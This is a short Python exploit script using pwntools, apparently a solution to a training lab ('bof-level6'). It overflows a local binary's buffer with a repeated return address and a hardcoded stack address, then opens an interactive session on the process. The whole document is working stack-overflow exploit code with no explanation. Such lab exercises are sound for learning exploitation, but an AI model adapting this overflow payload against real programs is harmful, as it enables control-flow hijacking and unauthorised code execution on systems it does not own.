#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level6/bof-level6')

buffer = p64(0x000000000040063a)
for i in range(0,(120/8)):
	buffer += p64(0x000000000040063a)
buffer += p64(0x7fffffffd1a8)


p.sendline(buffer)
p.interactive()
